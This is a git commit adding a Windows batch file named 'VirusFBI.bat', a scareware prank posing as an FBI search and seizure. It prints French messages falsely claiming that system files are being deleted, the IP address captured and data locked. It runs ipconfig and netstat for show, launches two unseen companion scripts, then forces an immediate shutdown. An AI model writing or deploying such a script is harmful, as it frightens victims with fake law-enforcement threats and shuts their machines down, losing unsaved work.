4888e204783ac3a0eb50302dfb924c824ff72c16
Anonymous623 <150555245+Anonymous623@users.noreply.github.com>
2023-11-11 23:29:49 +0100

    Add files via upload

---
+++ VirusFBI.bat
@@ -0,0 +1,72 @@
+@echo off
+color 0a
+title FBI HDD SEARCH AND SEIZURE
+echo.
+echo.
+echo                                             Demarrage des service de suppression de systeme windows 	
+ping localhost -n 4 > nul
+echo................................................................................................................................................
+echo
+echo                                                              -:+osyyhhhhhyyo+:.                                         
+echo                                                           -odNMMMMMMMMMMMMMMMMMMNh+-                                     
+echo                                                         :hMMMMMMMMMMMMMMMMMMMMMMMMMMmo.                                  
+echo                                                       -hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy-                                
+echo                                                     :hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy.                              
+echo                                                   :dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm/                             
+echo                                                  /NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo                            
+echo                                                 .NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/                           
+echo                                                 oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.                          
+echo                                                 hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+                          
+echo                                                 dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo                          
+echo                                                 hMMd-+ydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmhs+/hMM+                          
+echo                                                 sMMs   `-+hmMMMMMMMMMMMMMMMMMMMMMMMds:.`   sMM.                          
+echo                                                 :MMh       ./ymMMMMMMMMMMMMMMMMMmy:`       dMd                           
+echo                                                  `NMM/         ./sdNMMMMMMMMMNds/.         +MM+                           
+echo                                                   oMMN+.          `.:odMMMdo:.`          .+NMN`                           
+echo                                                     +NMMNdyo/:--...-:+ymdmmmy+:-...--:+oydmMMMo                            
+echo                                                     :mMMMMMMMMNNNNNMMMs`h`sMMMNNNNNMMMMMMMMMM`                            
+echo                                                    `ymMMMMMMMMMMMMMMMy``d``yMMMMMMMMMMMMMMMMm`                            
+echo                                                    .MMMMMMMMMNmdNMMMN.`hMy`.NMMMMMMNmdmNMMMMM+                            
+echo                                                    /MMMMMMNy/.``dMMMMdoMMM+dMMMMMM+-```-NMMMm.                            
+echo                                                    `sNMmmd/.    hMMMMMMMMMMMMMMMMM:    -mNd+`                             
+echo                                                      -/. -/-    mMMMmMMMmNMN+sNMMN`    `--                                
+echo                                                                  /MMN-MMM:hMm mMMN+                                        
+echo                                                                  `MMM:MMM/dMN.MMMy                                         
+echo                                                                   NMM/MMM/mMN-MMMo                                         
+echo                                                                   mMM/MMM/mMN:MMM+                                         
+echo                                                                   dMM/NMM/NMN/MMM/                                         
+echo                                                                   hMM/mMM/NMN+MMM-                                         
+echo                                                                   yMM/dMM:NMm+MMM.                                         
+echo                                                                   oMM:hMM-NMh+MMN                                          
+echo                                                                   /MM:yMM`mMo+MMd                                          
+echo                                                                    -+`+hy sd.-ys:     
+
+
+ 
+echo Recuperation de l'adresse IP...
+start ipconfig & 
+ping localhost -n 2 > nul
+echo .......................................................
+echo En cour de traitement ....
+ping localhost -n 3 > nul
+echo........................................................
+echo Recuperation reussite
+ping localhost -n 5 > nul
+echo........................................................
+echo Verrouillage des donnees en cour ...
+ping localhost -n 9 > nul
+start netstat &
+echo.........................................................
+echo Verrouillage des donnees termine
+ping localhost -n 2 > nul
+echo.........................................................
+
+start random.bat
+start sound.vbs
+
+ping localhost -n 15 > nul
+
+start shutdown.exe -s -t 00
+
+ping localhost -n 2 > nul
+
